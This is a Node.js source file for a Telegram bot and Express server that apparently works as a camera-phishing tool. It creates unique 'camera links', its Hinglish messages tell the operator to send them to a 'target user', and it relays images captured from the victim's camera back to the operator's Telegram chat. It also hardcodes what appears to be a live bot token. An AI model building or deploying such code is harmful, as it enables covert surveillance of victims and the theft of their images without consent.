const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");

const TOKEN = "8556524594:AAHmqFROoexxzEeXZHZs1U9b6cPVd_TOzZc"; // 🔴 YAHAN APNA REAL TOKEN DAALO
const DOMAIN = "https://arrucambot.onrender.com"; // 🔴 Baad mein Render ka link yahan aayega

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static("public"));

const links = {}; // token → chatId

// ✅ Upload folder
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// ✅ Multer storage
const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (req, file, cb) => {
    cb(null, Date.now() + ".jpg");
  },
});
const upload = multer({ storage });

// ✅ Jab koi bot ko photo bheje
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;

  const token = uuidv4();
  links[token] = chatId;

  const link = `${DOMAIN}/capture/${token}`;

  bot.sendMessage(
    chatId,
    `✅ Aapka camera link ready hai:\n\n${link}\n\nIs link ko target user ko bhejo.`
  );
});

// ✅ Camera page
app.get("/capture/:token", (req, res) => {
  if (!links[req.params.token]) return res.send("Invalid link!");
  res.sendFile(path.join(__dirname, "public", "capture.html"));
});

// ✅ Image upload + Telegram pe wapas bhejna
app.post("/api/upload/:token", upload.single("photo"), async (req, res) => {
  const chatId = links[req.params.token];
  if (!chatId) return res.json({ error: "Invalid token" });

  await bot.sendPhoto(chatId, req.file.path, {
    caption: "✅ Camera image mil gaya!",
  });

  delete links[req.params.token];
  res.json({ success: true });
});

// ✅ Server start
app.listen(3000, () => {
  console.log("Server running on port 3000");
});
